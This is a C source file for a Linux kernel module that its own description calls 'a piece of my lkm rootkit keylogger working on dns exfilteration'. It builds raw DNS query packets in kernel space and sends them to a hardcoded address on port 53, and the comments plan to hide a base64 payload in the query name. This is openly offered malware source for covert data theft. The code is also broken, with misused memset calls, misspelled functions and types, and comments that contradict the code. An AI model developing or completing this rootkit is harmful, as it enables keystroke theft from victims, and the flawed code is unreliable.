//randomize transaction id.
//get the www.abcde.com abcde part that is my payload in base64 encoding.
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <linux/string.h>
#include <net/sock.h>
#include <linux/inet.h>
#define DEST_PORT 53
#define DEST_IP 192.168.1.9
#define SIZE 512
static int __init dns_lkm_init(void)
{
/*int sock_create_kern(struct net *net, int family, int type, int protocol, struct socket **res);
net = network namespace provides isolated network env for processes, like, isolate system resources. network namespace includes its own network interface(eth0), iproutingtables, /proc/net entries. used in containers. &init_net def net ns thats used by the host. 
*/
socket* sock; //if fd<0 error code ENOMEM EPERM. 0 on success.
int ret = socket_create_kern(&inet_net, AF_INET, IPROTO_UDP, &sock);
if(ret<0)
  pr_err("Failed to create socket. %d\n",ret);
//kernel socket has been created.
struct sockaddr_in dest; //reps dest or src addres in a format that socket apis get, needed to be created in ipv4 network programs.
/*
struct sockaddr_in {
    __kernel_sa_family_t    sin_family;   // Address family: AF_INET
    __be16                  sin_port;     // Port number (network byte order)
    struct in_addr          sin_addr;     // IP address
    unsigned char           __pad[8];     // Padding
};
*/
memset(&dest, 0 , sizeof(dest)); //set the memory of sockadd_in dest to all zeroes.
dest.sin_family = AF_INET;
dest.sin_port = DEST_PORT; //destination port
dest.sin_addr= DEST_IP; //handle formatting.

//now preparing the pieces of our dns header 12 bytes
unsigned char buf[SIZE]; //why unsigned? buf[512] maximum dns packet size.
memset(buf, 0 , SIZE);
//first we have transaction id 2 bytes. ensure to randomize it in the final working keylogger.
buf[0] = 0x12; /*1 byte*/ buf[1] = 0x34; //2 bytes done.
//flags.
/*
| Bit(s) | Name   | Meaning                                                         |
| ------ | ------ | --------------------------------------------------------------- |
| 0      | QR     | Query (0) or Response (1)                                       |
| 1–4    | Opcode | Type of query: Standard (0), Inverse (1), Status (2), etc.      |
| 5      | AA     | Authoritative Answer (valid in responses)                       |
| 6      | TC     | Truncation — message was truncated                              |
| 7      | RD     | Recursion Desired (client wants recursive answer)               |
| 8      | RA     | Recursion Available (set by server if it supports recursion)    |
| 9      | Z      | Reserved — must be 0                                            |
| 10     | AD     | Authentic Data (DNSSEC)                                         |
| 11     | CD     | Checking Disabled (DNSSEC)                                      |
| 12–15  | RCODE  | Response code (e.g., 0=No error, 3=Name Error, 5=Refused, etc.) |
im interested in query = 0 and recursion desired may or not be, lets just make it 1 that we do desire it.
*/
buf[2] = 0x01; buf[3] = 0x00; //4 bytes completed here
//question count qdcount =0. we;re only wanting send one question, not multiple, also one used in real world, and "other" dns servers can ignore or even reject queries with multiple questions. we're not communicating with a server, but only for convenience sake, we keep it 1.
buf[4] = 0x00; buf[5] = 0x01;
//ancount useless for dns queries as it's the number of answers usually in dns responses.
buf[6] = 0x00; buf[7]=0x00;
//nscount = number of authority records. not our interest
buf[8] = 0x00; buf[9]=0x00;
//arcount number of additional records, useless for us
buf[10]=0x00; buf[11]=0x00;
/*DNS HEADER COMPLETED TILL HERE*/
/*DNS QUESTION PART STARTS*/
//making a separate [] here for convenience sake
unsigned char *qname = &buf[12];
*qname = 3; ++qname; memset(qname, "www", 3); qname +=3;
*qname = 5; ++qname; memset(qname, "mahii", 5); qname+=5;
*qname = 3; ++qname; memset(qname, "com",3); qname+=3;
*qname++ =0; //end of queryname.

//qtype A
*(unsigned short *)qname = htons(1); qname += 2; //unsigned short=2bytes, directly write 1 in 2 bytes from qname, htons makes sure 1 is written in bigendian, dns wants this.
//qclass internet.
*(unsigned short *)qname = htons(1); qname += 2; //similarly.
/*The struct msghdr (message header) in the context of socket programming represents the metadata associated with a message that is being sent or received via a socket. */
//ssize_t kernel_sendmsg(struct socket *sock, struct msghdr *msg, struct kvec *vec, size_t num_vecs, size_t len);
//kernel_sendmsg expexts metadata in the form of msghdr, data in the form of kvec.
struct msghdr msg; 
struct kvec vec;
/*
struct kvec {
    void *iov_base;  // Pointer to the buffer (data)
    size_t iov_len;  // Length of the buffer (size of the data)
};
struct msghdr {
    void          *msg_name;       // Pointer to the destination address (e.g., sockaddr_in for IP-based protocols)
    int           msg_namelen;     // Length of the address structure (usually sizeof(sockaddr_in))
    struct iovec *msg_iov;        // Array of iovec structures, representing the data to be sent or received
    size_t        msg_iovlen;      // Number of iovec structures
    void          *msg_control;    // Auxiliary data (e.g., control messages like file descriptors)
    size_t        msg_controllen;  // Length of msg_control
    int           msg_flags;       // Flags that control the send/recv operation
};
*/
memset(msg, 0 , sizeof(msg));
memset(vec, 0, sizeof(vev));
msg.msg_name = &dest;
msg.msg_namelen=sizeof(dest);
vec.iov_base = msg;
qsize = qname - buf; 
vec.iov_len = qsize;
//1 because we have only 1 buffer in kvec array.
//fifth gield is data in bytes to be sent.
ret = kernel_sendmsg(sock, msg, vec, 1, qsize);
if(ret<0)
pr_err("error sending message.");
}
static void __exit dns_lkm_exit(void)
{
pr_info("dns lkm exit");
}

module_init(dns_lkm_init);
module_exit(dns_lkm_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Me");
MODULE_DESCRIPTION("a piece of my lkm rootkit keylogger working on dns exfilteration");

